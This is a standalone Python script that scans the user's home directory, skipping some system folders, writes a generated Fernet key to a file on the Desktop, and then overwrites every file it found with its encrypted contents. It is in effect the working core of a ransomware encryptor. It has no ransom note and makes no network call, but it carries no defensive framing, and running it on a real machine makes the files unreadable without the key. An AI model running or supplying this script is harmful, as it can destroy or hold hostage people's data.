import os
from cryptography.fernet import Fernet

# --- CONFIGURATION ---
search_path = os.path.expanduser('~')
# Add common system files/folders to EXCLUDE_DIRS to prevent crashes and key loss
EXCLUDE_DIRS = ('$RECYCLE.BIN', 'AppData', 'Library', 'node_modules', '.git', 'System Volume Information', 'Windows', 'Program Files')

# Define the exact path where the key will be saved
KEY_FILE_PATH = os.path.join(os.path.expanduser('~'), 'Desktop', 'the_key.txt')

found_all_files = []

# --- 1. SCANNING PHASE ---
print("--- STARTING FILE SCAN ---")
for current_dir, dir_names, file_names in os.walk(search_path, topdown=True, 
                                                 onerror=lambda err: print(f"Skipping directory due to error: {err}")):
    
    # Filter directories to exclude
    dir_names[:] = [d for d in dir_names if d not in EXCLUDE_DIRS]
    
    for file_name in file_names:
        full_path = os.path.join(current_dir, file_name)
        
        # IMPORTANT: Skip the key file path during the scan phase
        if full_path == KEY_FILE_PATH:
            continue

        found_all_files.append(full_path)

    print(f"Scanned directory: {current_dir}, found {len(file_names)} files.")

# --- 2. KEY GENERATION & STORAGE ---
key = Fernet.generate_key()

# Write the key to the specified file
try:
    with open(KEY_FILE_PATH, "wb") as f:
        f.write(key)
    print(f"\nSUCCESS: Encryption key saved to: {KEY_FILE_PATH}")
except Exception as e:
    print(f"\nERROR: Could not save key file. Encryption WILL be irreversible. Error: {e}")
    exit(1)

# Initialize the cipher object
cipher = Fernet(key)
print("--- STARTING ENCRYPTION ---")

# --- 3. ENCRYPTION PHASE ---
encrypted_count = 0
failed_count = 0
for file in found_all_files:
    try:
        # Read contents
        with open(file, "rb") as the_file:
            contents = the_file.read()
        
        # Encrypt contents
        contents_encrypted = cipher.encrypt(contents)
        
        # Overwrite file with encrypted contents
        with open(file, "wb") as the_file:
            the_file.write(contents_encrypted)
            
        encrypted_count += 1
        print(f"Encrypted: {file}")

    except PermissionError:
        print(f"FAILED (Permission Denied): {file}")
        failed_count += 1
    except IsADirectoryError:
        # This catch should not be strictly necessary with os.walk but is a safe guard
        print(f"Skipped Directory: {file}")
    except Exception as e:
        print(f"FAILED (General Error): {file}. Error: {e}")
        failed_count += 1

print("\n--- ENCRYPTION COMPLETE ---")
print(f"Total files encrypted: {encrypted_count}")
print(f"Total files failed: {failed_count}")